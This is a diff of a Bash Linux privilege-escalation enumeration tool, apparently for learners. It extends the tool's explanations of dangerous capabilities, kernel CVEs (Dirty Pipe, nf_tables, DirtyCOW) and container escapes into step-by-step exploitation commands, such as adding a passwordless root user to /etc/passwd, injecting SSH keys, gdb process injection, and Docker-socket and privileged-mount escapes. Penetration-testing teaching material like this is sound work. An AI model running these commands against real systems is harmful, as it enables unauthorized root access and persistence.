+                    teach "  • /root/.bash_history - find credentials in commands"
+                    teach "  • Application config files - database passwords"
+                    ;;
+            esac
+            log ""
         fi
         
+        # Check for CAP_DAC_OVERRIDE
         if echo "$caps" | grep -q "cap_dac_override"; then
             critical "CAP_DAC_OVERRIDE on $bin - Write to any file including /etc/passwd"
             vuln "CAP_DAC_OVERRIDE found: $bin"
-            teach "This binary can bypass ALL file permission checks (read+write)"
-            teach "  Write to /etc/passwd, /etc/shadow, or any protected file"
+            log ""
+            teach "╔════════════════════════════════════════════════════════════╗"
+            teach "║  CAP_DAC_OVERRIDE - Bypass ALL File Permission Checks"
+            teach "╚════════════════════════════════════════════════════════════╝"
+            teach ""
+            teach "WHAT IT IS:"
+            teach "  Like CAP_DAC_READ_SEARCH, but for WRITE permissions too."
+            teach "  You can READ and WRITE any file, regardless of permissions."
+            teach "  This is almost as powerful as being root."
+            teach ""
+            teach "WHY IT EXISTS:"
+            teach "  System management tools need to modify protected files."
+            teach "  Package managers, system updaters, etc."
+            teach ""
+            teach "WHAT YOU CAN DO:"
+            teach "  • Modify /etc/passwd (add root user)"
+            teach "  • Modify /etc/shadow (remove root's password)"
+            teach "  • Modify /etc/sudoers (give yourself sudo access)"
+            teach "  • Replace /bin/bash with a backdoored version"
+            teach "  • Inject SSH keys into /root/.ssh/authorized_keys"
+            teach ""
+            teach "EXPLOITATION STRATEGY:"
+            teach "  Option 1 - Add root user to /etc/passwd:"
+            teach "    echo 'hacker::0:0::/root:/bin/bash' | $bin tee -a /etc/passwd"
+            teach "    su hacker (no password needed)"
+            teach ""
+            teach "  Option 2 - Remove root password from /etc/shadow:"
+            teach "    If binary can edit files, remove the hash between first and second :"
+            teach "    Before: root:\$6\$long_hash:..."
+            teach "    After:  root::..."
+            teach "    su root (no password)"
+            teach ""
+            teach "  Option 3 - Inject SSH key:"
+            teach "    echo 'YOUR_PUBLIC_KEY' | $bin tee -a /root/.ssh/authorized_keys"
+            teach "    ssh -i your_private_key root@localhost"
+            log ""
         fi
         
+        # Check for CAP_SYS_PTRACE
         if echo "$caps" | grep -q "cap_sys_ptrace"; then
             vuln "CAP_SYS_PTRACE found: $bin"
-            teach "This binary can debug (attach to) any process"
-            teach "  Attach to root process, inject shellcode or call system()"
+            log ""
+            teach "╔════════════════════════════════════════════════════════════╗"
+            teach "║  CAP_SYS_PTRACE - Debug and Inject Into Any Process"
+            teach "╚════════════════════════════════════════════════════════════╝"
+            teach ""
+            teach "WHAT IT IS:"
+            teach "  ptrace() is the system call debuggers use to inspect/control"
+            teach "  other processes. CAP_SYS_PTRACE lets you debug ANY process,"
+            teach "  including those owned by root."
+            teach ""
+            teach "WHY IT EXISTS:"
+            teach "  Debuggers (gdb, strace) need to attach to processes."
+            teach "  System monitoring tools need to inspect running programs."
+            teach ""
+            teach "EXPLOITATION:"
+            teach "  If you can attach to a root process, you can:"
+            teach "  1. Inject shellcode (malicious code)"
+            teach "  2. Make it call system() to execute commands"
+            teach "  3. Hijack its execution flow"
+            teach ""
+            teach "EXAMPLE - Inject into a root process:"
+            teach "  1. Find a root process:"
+            teach "     ps aux | grep root"
+            teach "  2. Use gdb to attach:"
+            teach "     gdb -p <PID>"
+            teach "  3. Call system() from within the process:"
+            teach "     (gdb) call (int)system(\"chmod u+s /bin/bash\")"
+            teach "  4. Detach:"
+            teach "     (gdb) detach"
+            teach "  5. /bin/bash is now SUID root"
+            teach "     /bin/bash -p"
+            teach ""
+            teach "SIMPLER METHOD - shellcode injection tools:"
+            teach "  Use tools like 'linux-inject' to automate process injection"
+            log ""
         fi
         
+        # Check for CAP_SYS_ADMIN
         if echo "$caps" | grep -q "cap_sys_admin"; then
             critical "CAP_SYS_ADMIN on $bin - Nearly equivalent to root"
             vuln "CAP_SYS_ADMIN found: $bin"
-            teach "This capability is extremely broad - almost equivalent to root"
-            teach "  Can mount filesystems, load kernel modules, and more"
+            log ""
+            teach "╔════════════════════════════════════════════════════════════╗"
+            teach "║  CAP_SYS_ADMIN - The 'God Mode' Capability"
+            teach "╚════════════════════════════════════════════════════════════╝"
+            teach ""
+            teach "WHAT IT IS:"
+            teach "  CAP_SYS_ADMIN is a catch-all for 'system administration' tasks."
+            teach "  It's extremely broad and provides many root-equivalent powers."
+            teach "  Often called 'the new root' because it's so powerful."
+            teach ""
+            teach "WHAT IT ALLOWS:"
+            teach "  • Mount filesystems"
+            teach "  • Load kernel modules"
+            teach "  • Perform system administration operations"
+            teach "  • Manipulate namespaces"
+            teach "  • Many other privileged operations"
+            teach ""
+            teach "WHY IT'S DANGEROUS:"
+            teach "  It was supposed to be for 'admin operations that don't fit"
+            teach "  other capabilities'. But so many things got added to it that"
+            teach "  having CAP_SYS_ADMIN is almost the same as being root."
+            teach ""
+            teach "EXPLOITATION:"
+            teach "  Multiple paths to root with CAP_SYS_ADMIN:"
+            teach ""
+            teach "  Option 1 - Mount host filesystem (if in container):"
+            teach "  Option 2 - Load kernel module with backdoor"
+            teach "  Option 3 - Manipulate /proc/sys to weaken security"
+            teach ""
+            teach "  This capability is too broad to cover all exploitation paths."
+            teach "  Research specific to your situation."
+            log ""
+        fi
+        
+        # Other capabilities
+        if echo "$caps" | grep -qE "cap_net_admin|cap_net_raw"; then
+            info "Network capabilities: $caps on $bin"
+            teach "Network capabilities detected - useful for network manipulation"
+            teach "  but typically not direct privilege escalation paths"
+            log ""
+        fi
+        
+        if echo "$caps" | grep -qE "cap_sys_module"; then
+            critical "CAP_SYS_MODULE on $bin - Load kernel modules"
+            vuln "CAP_SYS_MODULE found: $bin"
+            teach "This binary can load kernel modules - create a malicious module"
+            teach "  to get root-level kernel code execution"
+            log ""
         fi
     done
     
     if [ $caps_found -eq 0 ]; then
-        ok "No dangerous capabilities found"
+        ok "Only harmless capabilities found (network-related, not exploitable)"
+        return
+    fi
+    
+    # Only show key takeaways if we found dangerous capabilities
+    if [ $has_dangerous_caps -eq 1 ]; then
+        log ""
+        teach "═══════════════════════════════════════════════════════════════"
+        teach "CAPABILITIES - KEY TAKEAWAYS"
+        teach "═══════════════════════════════════════════════════════════════"
+        teach ""
+        teach "MENTAL MODEL:"
+        teach "  Think of capabilities as 'root lite' - specific pieces of root's"
+        teach "  power distributed individually instead of all-or-nothing."
+        teach ""
+        teach "THE BIG THREE FOR PRIVILEGE ESCALATION:"
+        teach "  1. CAP_SETUID = Can become root directly (most powerful)"
+        teach "  2. CAP_DAC_OVERRIDE = Can read/write any file (almost as good)"
+        teach "  3. CAP_SYS_ADMIN = Swiss army knife (way too broad)"
+        teach ""
+        teach "HOW TO CHECK FOR CAPABILITIES:"
+        teach "  getcap -r / 2>/dev/null"
+        teach "  (Searches entire filesystem for capability-enabled binaries)"
+        teach ""
+        teach "DEFENSIVE PERSPECTIVE:"
+        teach "  Capabilities are actually a SECURITY IMPROVEMENT over SUID."
+        teach "  They follow the principle of least privilege."
+        teach "  But if misconfigured (like CAP_SETUID on python), they're just"
+        teach "  as dangerous as SUID root."
+        log ""
     fi
 }
-
 # === CRON JOBS ===
 enum_cron() {
     section "CRON JOB ANALYSIS"
@@ -1836,61 +3128,371 @@ enum_cron() {
 }
 
 # === KERNEL EXPLOITS ===
+# === KERNEL EXPLOIT DETECTION ===
 enum_kernel() {
     section "KERNEL EXPLOIT DETECTION"
+    
+    explain_concept "Kernel Exploits" \
+        "The kernel is the core of Linux, managing hardware, processes, and security. Vulnerabilities here affect all users and often give instant root." \
+        "The kernel has complete control over the system - it manages memory, processes, hardware, and enforces all security. It runs in 'ring 0' (highest privilege). Any code execution in kernel space = total system control. Unlike user-space exploits (SUID, sudo), kernel exploits work regardless of user permissions." \
+        "Why kernel exploits are powerful:\n  • Bypass ALL security mechanisms (capabilities, AppArmor, SELinux)\n  • Affect ALL users on the system\n  • Escape containers (containers share host kernel)\n  • No authentication needed\n  • Universal - same exploit works across distributions\n\nWhy they exist:\n  • Kernel is millions of lines of C code\n  • Handles complex low-level operations\n  • Must support ancient hardware/features\n  • Race conditions in multi-threading\n  • Memory corruption bugs"
     
     local kernel=$(uname -r)
     local kernel_version=$(echo "$kernel" | grep -oE '^[0-9]+\.[0-9]+\.[0-9]+')
     
     info "Kernel version: $kernel"
-    info "Kernel numeric: $kernel_version"
-    
-    explain_concept "Kernel Exploits" \
-        "The kernel is the core of Linux, managing hardware, processes, and security. Vulnerabilities here affect all users and often give instant root." \
-        "Kernel bugs are constantly found. Older kernels have known exploitable CVEs. Patching requires reboot so admins delay it. Containers often share host kernel, making kernel exploits valuable. Most exploits require compiling C code." \
-        "Process:\n  1. Check kernel version: uname -r\n  2. Search exploit-db.com or GitHub\n  3. Compile exploit on similar system\n  4. Transfer and run\n  5. Common: DirtyCOW, Dirty Pipe, PwnKit, nf_tables"
+    info "Kernel numeric version: $kernel_version"
+    log ""
     
     # Parse version for comparison
     local major=$(echo "$kernel_version" | cut -d. -f1)
     local minor=$(echo "$kernel_version" | cut -d. -f2)
     local patch=$(echo "$kernel_version" | cut -d. -f3)
     
-    # Check for specific CVEs
+    info "Checking kernel against known exploitable vulnerabilities..."
+    log ""
+    
+    # === Dirty Pipe (CVE-2022-0847) ===
     if [ "$major" -eq 5 ] && [ "$minor" -ge 8 ] && [ "$minor" -le 16 ]; then
         critical "Kernel vulnerable to Dirty Pipe (CVE-2022-0847) - Instant root"
         vuln "Potentially vulnerable to Dirty Pipe (CVE-2022-0847)"
-        explain_concept "Dirty Pipe" \
-            "Allows overwriting data in read-only files by exploiting pipe buffer handling." \
-            "Kernel versions 5.8-5.16.11 vulnerable. Allows modifying files you can't write to. Typically used to overwrite /etc/passwd to add root user." \
-            "Exploit:\n  1. Download: github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits\n  2. Compile: gcc exploit.c -o exploit\n  3. Run: ./exploit\n  4. Creates root user or SUID /bin/bash"
+        log ""
+        teach "╔════════════════════════════════════════════════════════════╗"
+        teach "║  CVE-2022-0847 - Dirty Pipe (Arbitrary File Overwrite)"
+        teach "╚════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT IT IS:"
+        teach "  A vulnerability that allows overwriting data in read-only files"
+        teach "  by exploiting how Linux handles pipe buffers. Named after the"
+        teach "  similar 'Dirty COW' vulnerability from 2016."
+        teach ""
+        teach "WHY IT EXISTS:"
+        teach "  Linux uses 'pipes' to pass data between processes (like |)."
+        teach "  Pipes use special memory buffers called 'pipe buffers'."
+        teach "  These buffers have flags to track their state."
+        teach ""
+        teach "THE BUG:"
+        teach "  When merging pipe buffers, the kernel forgot to clear the"
+        teach "  PIPE_BUF_FLAG_CAN_MERGE flag. This flag should be cleared"
+        teach "  when data is copied into a page cache (file cache in memory)."
+        teach ""
+        teach "  The exploit works like this:"
+        teach "  1. Open a read-only file (like /etc/passwd)"
+        teach "  2. Create a pipe"
+        teach "  3. Write data to the pipe that you want to inject"
+        teach "  4. Splice the pipe into the target file"
+        teach "  5. Because the flag wasn't cleared, kernel allows the write"
+        teach "  6. You've now modified a read-only file!"
+        teach ""
+        teach "REAL-WORLD EXAMPLE:"
+        teach "  Target: /etc/passwd (read-only, owned by root)"
+        teach "  Action: Add a new root user without password"
+        teach "  Result: Instant root access"
+        teach ""
+        teach "HOW TO EXPLOIT:"
+        teach "  1. Check if vulnerable:"
+        teach "     uname -r (kernel 5.8 - 5.16.11 = vulnerable)"
+        teach "  2. Download exploit:"
+        teach "     https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"
+        teach "  3. Compile:"
+        teach "     gcc exploit-1.c -o exploit"
+        teach "  4. Run:"
+        teach "     ./exploit"
+        teach "  5. The exploit will:"
+        teach "     - Overwrite /etc/passwd to add user 'aaron' with no password"
+        teach "     - Or make /bin/bash SUID for instant root"
+        teach ""
+        teach "WHY IT'S CALLED DIRTY PIPE:"
+        teach "  • 'Dirty' = Modifying read-only data (like Dirty COW)"
+        teach "  • 'Pipe' = Exploits Linux pipe mechanism"
+        teach ""
+        teach "AFFECTED SYSTEMS:"
+        teach "  Kernels: 5.8 - 5.16.11, 5.15.25, 5.10.102"
+        teach "  Most Linux distributions from 2020-2022"
+        teach ""
+        teach "IMPACT: Any user can overwrite any file → Root access"
+        log ""
     fi
     
+    # === nf_tables (CVE-2024-1086) ===
     if [ "$major" -eq 5 ] && [ "$minor" -ge 14 ] && [ "$minor" -le 18 ]; then
         vuln "Potentially vulnerable to nf_tables (CVE-2024-1086)"
-        teach "Requires CONFIG_USER_NS=y and nftables support"
-        teach "  Check: grep CONFIG_USER_NS /boot/config-\$(uname -r)"
-        teach "  Exploit: github.com/Notselwyn/CVE-2024-1086"
-        teach "  Complex UAF exploit, needs compilation"
+        log ""
+        teach "╔════════════════════════════════════════════════════════════╗"
+        teach "║  CVE-2024-1086 - nf_tables Use-After-Free"
+        teach "╚════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT IT IS:"
+        teach "  A use-after-free vulnerability in the nftables (netfilter)"
+        teach "  subsystem that allows local privilege escalation to root."
+        teach ""
+        teach "BACKGROUND - What is nftables:"
+        teach "  nftables is Linux's firewall framework (successor to iptables)."
+        teach "  It allows filtering network packets, managing firewall rules."
+        teach "  Runs in kernel space for performance."
+        teach ""
+        teach "WHY IT EXISTS:"
+        teach "  'Use-after-free' is a memory corruption bug. Here's what happens:"
+        teach ""
+        teach "  1. Kernel allocates memory for an nftables object"
+        teach "  2. Kernel frees that memory (object deleted)"
+        teach "  3. Kernel tries to use that memory again"
+        teach "  4. But the memory might now contain attacker-controlled data"
+        teach "  5. Kernel executes attacker's data = code execution as root"
+        teach ""
+        teach "SIMPLIFIED ANALOGY:"
+        teach "  Imagine a library book:"
+        teach "  1. You check out a book (allocate memory)"
+        teach "  2. You return it (free memory)"
+        teach "  3. Someone else checks it out and writes notes in it"
+        teach "  4. You try to read your old notes (use-after-free)"
+        teach "  5. But you're actually reading the new person's notes!"
+        teach ""
+        teach "TECHNICAL DETAILS:"
+        teach "  The vulnerability is in how nftables handles anonymous sets."
+        teach "  When deleting rules, the kernel frees memory but doesn't"
+        teach "  clear all references to it. Attacker can trigger reuse of"
+        teach "  that freed memory, overwriting kernel data structures."
+        teach ""
+        teach "REQUIREMENTS:"
+        teach "  • CONFIG_USER_NS=y (user namespaces enabled)"
+        teach "  • nftables support compiled in kernel"
+        teach ""
+        teach "HOW TO CHECK IF EXPLOITABLE:"
+        teach "  1. Check kernel config:"
+        teach "     grep CONFIG_USER_NS /boot/config-\$(uname -r)"
+        teach "  2. If =y, likely vulnerable"
+        teach ""
+        teach "HOW TO EXPLOIT:"
+        teach "  1. Check if vulnerable: uname -r (5.14-5.18)"
+        teach "  2. Download exploit:"
+        teach "     https://github.com/Notselwyn/CVE-2024-1086"
+        teach "  3. Compile (requires kernel headers):"
+        teach "     gcc exploit.c -o exploit"
+        teach "  4. Run:"
+        teach "     ./exploit"
+        teach ""
+        teach "WHY IT'S COMPLEX:"
+        teach "  This is an advanced exploit requiring:"
+        teach "  • Understanding of kernel memory management"
+        teach "  • Heap manipulation (kernel heap spray)"
+        teach "  • Timing-dependent (race condition)"
+        teach ""
+        teach "IMPACT: Local privilege escalation, works in containers"
+        log ""
     fi
     
+    # === DirtyCOW (CVE-2016-5195) ===
     if [ "$major" -eq 4 ]; then
         vuln "Kernel 4.x - Multiple known exploits available"
-        teach "Search for specific version on exploit-db.com"
+        teach "Older kernel - check exploit-db for specific version"
+        log ""
         
         if [ "$minor" -le 10 ]; then
             critical "Kernel vulnerable to DirtyCOW (CVE-2016-5195) - Instant root"
             vuln "Potentially vulnerable to DirtyCOW (CVE-2016-5195)"
-            teach "Classic race condition in memory management"
-            teach "  Exploit: github.com/firefart/dirtycow"
-            teach "  Creates user 'firefart' with UID 0"
+            log ""
+            teach "╔════════════════════════════════════════════════════════════╗"
+            teach "║  CVE-2016-5195 - Dirty COW (Copy-On-Write Race Condition)"
+            teach "╚════════════════════════════════════════════════════════════╝"
+            teach ""
+            teach "WHAT IT IS:"
+            teach "  One of the most famous Linux kernel vulnerabilities ever found."
+            teach "  Allows writing to read-only files by exploiting a race condition"
+            teach "  in the Copy-On-Write (COW) mechanism. Existed for 9+ years."
+            teach ""
+            teach "BACKGROUND - What is Copy-On-Write:"
+            teach "  When you fork() a process, Linux doesn't immediately copy all"
+            teach "  memory. Instead, parent and child share the same memory pages"
+            teach "  marked as read-only. Only when one tries to write, the kernel"
+            teach "  makes a copy. This saves memory and improves performance."
+            teach ""
+            teach "WHY IT EXISTS (The Race Condition):"
+            teach "  There's a tiny time window between when the kernel:"
+            teach "  1. Checks if you can write to a page (permission check)"
+            teach "  2. Actually performs the write operation"
+            teach ""
+            teach "  The exploit abuses this timing gap:"
+            teach "  Thread 1: Repeatedly calls madvise() to discard the page"
+            teach "  Thread 2: Repeatedly tries to write to the read-only file"
+            teach ""
+            teach "  If timed perfectly:"
+            teach "  • Thread 1 discards the COW page"
+            teach "  • Thread 2 writes during the tiny gap"
+            teach "  • Kernel writes to the ORIGINAL page (not the copy)"
+            teach "  • You've just modified a read-only file!"
+            teach ""
+            teach "WHY IT'S CALLED DIRTY COW:"
+            teach "  • 'Dirty' = Modified pages in memory"
+            teach "  • 'COW' = Copy-On-Write mechanism"
+            teach "  • Also a fun name that went viral"
+            teach ""
+            teach "THE EXPLOIT PROCESS:"
+            teach "  1. Open /etc/passwd (read-only)"
+            teach "  2. Map it into memory with mmap()"
+            teach "  3. Start two threads racing:"
+            teach "     - One calling madvise(MADV_DONTNEED) repeatedly"
+            teach "     - One writing to the memory repeatedly"
+            teach "  4. Race condition succeeds"
+            teach "  5. Your write goes to the real file"
+            teach "  6. Add root user or overwrite existing user's password hash"
+            teach ""
+            teach "HOW TO EXPLOIT:"
+            teach "  1. Check vulnerability: uname -r (< 4.8.3 = vulnerable)"
+            teach "  2. Download exploit:"
+            teach "     https://github.com/dirtycow/dirtycow.github.io"
+            teach "     https://github.com/firefart/dirtycow"
+            teach "  3. Compile:"
+            teach "     gcc -pthread dirty.c -o dirty -lcrypt"
+            teach "  4. Run:"
+            teach "     ./dirty mypassword"
+            teach "  5. Creates user 'firefart' with UID 0 (root)"
+            teach "  6. Login:"
+            teach "     su firefart"
+            teach "     Password: mypassword"
+            teach ""
+            teach "VARIATIONS:"
+            teach "  • SUID binary injection (make /usr/bin/passwd writeable)"
+            teach "  • Direct /etc/shadow modification"
+            teach "  • SELinux/AppArmor policy modification"
+            teach ""
+            teach "WHY IT EXISTED SO LONG:"
+            teach "  • Race conditions are hard to find"
+            teach "  • The timing window is microseconds"
+            teach "  • Required specific knowledge of kernel internals"
+            teach "  • Copy-On-Write is a fundamental kernel feature"
+            teach ""
+            teach "IMPACT: Any user → Root, works on almost all Linux systems"
+            teach "        Affected billions of devices (servers, Android, IoT)"
+            log ""
         fi
     fi
     
-    info "For comprehensive kernel exploit search:"
-    info "  https://github.com/mzet-/linux-exploit-suggester"
-    info "  https://github.com/jondonas/linux-exploit-suggester-2"
+    # === Kernel 3.x ===
+    if [ "$major" -eq 3 ]; then
+        critical "Kernel 3.x - ANCIENT kernel with many known exploits"
+        vuln "Extremely outdated kernel - highly exploitable"
+        log ""
+        teach "╔════════════════════════════════════════════════════════════╗"
+        teach "║  Kernel 3.x - Legacy Kernel (End of Life)"
+        teach "╚════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT THIS MEANS:"
+        teach "  Kernel 3.x was released 2011-2015 and is no longer maintained."
+        teach "  It contains DOZENS of known privilege escalation vulnerabilities."
+        teach ""
+        teach "COMMON KERNEL 3.x EXPLOITS:"
+        teach "  • DirtyCOW (CVE-2016-5195) - Already described above"
+        teach "  • Overlayfs (CVE-2015-1328) - Ubuntu specific"
+        teach "  • perf_event (CVE-2013-2094) - Affects 3.4 - 3.13"
+        teach "  • recvmsg (CVE-2014-0038) - Memory corruption"
+        teach "  • futex (CVE-2014-3153) - Towelroot exploit"
+        teach ""
+        teach "HOW TO FIND EXPLOITS:"
+        teach "  1. Check exact version: uname -r"
+        teach "  2. Search exploit-db:"
+        teach "     searchsploit linux kernel $kernel_version"
+        teach "  3. Try automated tools:"
+        teach "     https://github.com/mzet-/linux-exploit-suggester"
+        teach "     ./linux-exploit-suggester.sh"
+        teach "  4. Check specific CVE databases"
+        teach ""
+        teach "RECOMMENDATION:"
+        teach "  Use exploit suggester tools - too many CVEs to check manually"
+        log ""
+    fi
+    
+    # === Kernel 2.x ===
+    if [ "$major" -eq 2 ]; then
+        critical "Kernel 2.x - PREHISTORIC kernel - trivial to exploit"
+        vuln "Kernel from the stone age - run exploit suggester"
+        log ""
+        teach "This kernel is from the early 2000s. It predates most modern"
+        teach "security features. Almost certainly has dozens of working exploits."
+        teach "Use linux-exploit-suggester to find them all."
+        log ""
+    fi
+    
+    # === General guidance ===
+    log ""
+    teach "═══════════════════════════════════════════════════════════════"
+    teach "KERNEL EXPLOITATION - GENERAL CONCEPTS"
+    teach "═══════════════════════════════════════════════════════════════"
+    teach ""
+    teach "WHY KERNEL EXPLOITS ARE DIFFERENT:"
+    teach ""
+    teach "  User-space exploits (sudo, SUID, cron):"
+    teach "  • Require specific misconfigurations"
+    teach "  • Depend on what's installed"
+    teach "  • Can be fixed by admin without reboot"
+    teach "  • Different across systems"
+    teach ""
+    teach "  Kernel exploits:"
+    teach "  • Work regardless of system configuration"
+    teach "  • Same kernel = same vulnerability across distributions"
+    teach "  • Bypass ALL security (SELinux, AppArmor, containers)"
+    teach "  • Require reboot to patch (admins delay this)"
+    teach "  • Escape containers (containers share host kernel)"
+    teach ""
+    teach "KERNEL EXPLOIT WORKFLOW:"
+    teach ""
+    teach "  1. IDENTIFY"
+    teach "     • Check kernel version: uname -r"
+    teach "     • Note the distribution: cat /etc/os-release"
+    teach "     • Check architecture: uname -m"
+    teach ""
+    teach "  2. SEARCH"
+    teach "     • exploit-db: searchsploit linux kernel [version]"
+    teach "     • Google: 'linux kernel [version] exploit'"
+    teach "     • Exploit suggester: linux-exploit-suggester.sh"
+    teach "     • GitHub: Search for CVE numbers"
+    teach ""
+    teach "  3. DOWNLOAD"
+    teach "     • wget/curl to download .c file"
+    teach "     • Or git clone the repository"
+    teach "     • Read the exploit code (understand what it does)"
+    teach ""
+    teach "  4. COMPILE"
+    teach "     • Check if gcc/make available: which gcc"
+    teach "     • Compile: gcc exploit.c -o exploit"
+    teach "     • Some need specific flags (read exploit comments)"
+    teach "     • If no compiler, compile on similar system and transfer"
+    teach ""
+    teach "  5. EXECUTE"
+    teach "     • chmod +x exploit"
+    teach "     • ./exploit"
+    teach "     • Many exploits spawn root shell automatically"
+    teach "     • Some require additional steps (read the output)"
+    teach ""
+    teach "TROUBLESHOOTING:"
+    teach "  • Exploit doesn't compile:"
+    teach "    - Check kernel headers: apt install linux-headers-\$(uname -r)"
+    teach "    - Try on matching system and transfer binary"
+    teach ""
+    teach "  • Exploit crashes:"
+    teach "    - Kernel exploits are often unstable"
+    teach "    - Try different exploit for same CVE"
+    teach "    - Check if kernel is slightly different version"
+    teach ""
+    teach "  • No root shell:"
+    teach "    - Check if ASLR/SMEP/SMAP enabled (harder exploitation)"
+    teach "    - Try a different exploit variant"
+    teach ""
+    teach "CONTAINERS AND KERNEL EXPLOITS:"
+    teach "  • Containers (Docker, LXC) share the HOST kernel"
+    teach "  • If host kernel is vulnerable, container can escape"
+    teach "  • Kernel exploit in container = root on HOST"
+    teach "  • This is why kernel patches are critical for containers"
+    teach ""
+    teach "RECOMMENDED TOOLS:"
+    teach "  • linux-exploit-suggester:"
+    teach "    https://github.com/mzet-/linux-exploit-suggester"
+    teach "  • linux-exploit-suggester-2:"
+    teach "    https://github.com/jondonas/linux-exploit-suggester-2"
+    teach ""
+    info "For comprehensive kernel exploit search, use the tools above"
+    log ""
 }
-
 # === PATH HIJACKING ===
 enum_path() {
     section "PATH HIJACKING OPPORTUNITIES"
@@ -2031,43 +3633,238 @@ enum_container() {
     explain_concept "Container Environments" \
         "Containers isolate processes but share the host kernel. Misconfigurations or vulnerabilities can allow escape to host." \
         "Containers use namespaces and cgroups for isolation. If privileged, mounted with host volumes, or on vulnerable Docker, you may escape. Containers are NOT VMs - same kernel as host." \
-        "Common escape vectors:\n  • Privileged container (--privileged flag)\n  • Docker socket mounted inside\n  • Host filesystem mounted\n  • Kernel exploits (affects host)\n  • CAP_SYS_ADMIN capability"
+        "Common escape vectors:\n  • Privileged container (--privileged flag)\n  • Docker socket mounted inside\n  • Host filesystem mounted\n  • Kernel exploits (affects host)\n  • CAP_SYS_ADMIN capability\n  • Misconfigured cgroups\n  • Shared PID namespace"
+    
+    local in_container=0
+    local container_type=""
     
     # Check if running in container
     if [ -f /.dockerenv ]; then
+        in_container=1
+        container_type="Docker"
         warn "Running inside a DOCKER container"
         
-        # Check if privileged
-        if ip link add dummy0 type dummy 2>/dev/null; then
-            ip link delete dummy0 2>/dev/null
-            critical "PRIVILEGED CONTAINER - Mount host: mount /dev/sda1 /mnt then chroot /mnt"
-            vuln "Container is PRIVILEGED!"
-            explain_concept "Privileged Container Escape" \
-                "Privileged containers have almost all capabilities and can access host devices." \
-                "The --privileged flag disables most security features. It's used for nested Docker, device access, etc. But it allows mounting host filesystem and accessing host resources." \
-                "Exploitation:\n  mkdir /tmp/hostfs\n  mount /dev/sda1 /tmp/hostfs\n  chroot /tmp/hostfs\n  Now you're on the host filesystem as root"
+        # Check .dockerenv contents (sometimes contains info)
+        if [ -s /.dockerenv ]; then
+            info "/.dockerenv is not empty:"
+            cat /.dockerenv 2>/dev/null
         fi
         
-        # Check for Docker socket
-        if [ -S /var/run/docker.sock ]; then
-            critical "Docker socket in container - Control host Docker daemon"
-            vuln "Docker socket is mounted inside container!"
-            teach "You can control the Docker daemon from inside the container"
-            teach "  Create new privileged container and escape"
-        fi
+    elif [ -f /run/.containerenv ]; then
+        in_container=1
+        container_type="Podman"
+        warn "Running inside a PODMAN container"
         
-        # Check for suspicious mounts
-        if mount | grep -q "/ type.*rw"; then
-            warn "Root filesystem might be mounted from host"
-        fi
+    elif grep -qa container=lxc /proc/1/environ 2>/dev/null; then
+        in_container=1
+        container_type="LXC"
+        warn "Running inside an LXC container"
         
-    elif [ -d /proc/vz ]; then
-        info "Running in OpenVZ container"
-    elif grep -q "lxc" /proc/1/cgroup 2>/dev/null; then
-        warn "Running in LXC container"
-    else
-        ok "Not in a detected container environment"
+    elif [ -d /proc/vz ] && [ ! -d /proc/bc ]; then
+        in_container=1
+        container_type="OpenVZ"
+        warn "Running inside OpenVZ container"
     fi
+    
+    if [ $in_container -eq 0 ]; then
+        ok "Not in a detected container environment"
+        return
+    fi
+    
+    # Detailed container analysis
+    info "Container type detected: $container_type"
+    
+    # === CHECK 1: Privileged Container ===
+    info "Checking if container is privileged..."
+    if ip link add dummy0 type dummy 2>/dev/null; then
+        ip link delete dummy0 2>/dev/null
+        critical "PRIVILEGED CONTAINER - Full host access possible"
+        vuln "Container is PRIVILEGED!"
+        explain_concept "Privileged Container Escape" \
+            "Privileged containers have almost all capabilities and can access host devices." \
+            "The --privileged flag disables most security features. It's used for nested Docker, device access, etc. But it allows mounting host filesystem and accessing host resources." \
+            "Exploitation:\n  1. List host disks: fdisk -l\n  2. Mount host root: mkdir /mnt/host && mount /dev/sda1 /mnt/host\n  3. Chroot to host: chroot /mnt/host /bin/bash\n  4. Alternative: Access /dev/mem or /dev/kmem for direct memory access"
+        
+        teach "Privileged escape steps:"
+        teach "  fdisk -l  # Find host disk (usually /dev/sda1 or /dev/vda1)"
+        teach "  mkdir /mnt/host"
+        teach "  mount /dev/sda1 /mnt/host"
+        teach "  chroot /mnt/host /bin/bash"
+        teach "  # You're now on the host as root"
+    else
+        ok "Container is NOT privileged (cannot create network interfaces)"
+    fi
+    
+    # === CHECK 2: Capabilities ===
+    info "Checking container capabilities..."
+    if command -v capsh >/dev/null 2>&1; then
+        local caps=$(capsh --print 2>/dev/null)
+        echo "$caps" | grep "Current:" | log
+        
+        # Check for dangerous capabilities
+        if echo "$caps" | grep -q "cap_sys_admin"; then
+            critical "CAP_SYS_ADMIN in container - Mount host filesystem or load kernel modules"
+            vuln "Container has CAP_SYS_ADMIN!"
+            teach "With CAP_SYS_ADMIN you can:"
+            teach "  • Mount host filesystems"
+            teach "  • Manipulate namespaces"
+            teach "  • Potentially escape container"
+        fi
+        
+        if echo "$caps" | grep -q "cap_sys_ptrace"; then
+            warn "CAP_SYS_PTRACE - Can debug host processes if PID namespace shared"
+        fi
+        
+        if echo "$caps" | grep -q "cap_dac_override"; then
+            warn "CAP_DAC_OVERRIDE - Can bypass file permissions on mounted volumes"
+        fi
+    else
+        warn "capsh not available - install libcap2-bin to check capabilities"
+    fi
+    
+    # === CHECK 3: Docker Socket ===
+    if [ -S /var/run/docker.sock ]; then
+        critical "Docker socket MOUNTED - Full container orchestration access"
+        vuln "Docker socket is accessible inside container: /var/run/docker.sock"
+        explain_concept "Docker Socket Exploitation" \
+            "The Docker socket allows full control over the Docker daemon. If mounted inside a container, you can create new containers, access host filesystem, or escape." \
+            "Developers mount docker.sock for 'Docker-in-Docker' scenarios or CI/CD. This gives container full control over all containers and the host." \
+            "Exploitation:\n  1. Create privileged container: docker run -v /:/host -it alpine chroot /host /bin/bash\n  2. Or exec into existing container as root\n  3. Access host filesystem through new container"
+        
+        # Check if we can actually use it
+        if command -v docker >/dev/null 2>&1; then
+            if docker ps 2>/dev/null | grep -q "."; then
+                critical "Docker socket is USABLE - Can create escape container"
+                teach "Escape command:"
+                teach "  docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
+            fi
+        else
+            warn "Docker socket present but docker client not installed"
+            teach "If you can install or upload docker binary, you can escape"
+        fi
+    fi
+    
+    # === CHECK 4: Seccomp Profile ===
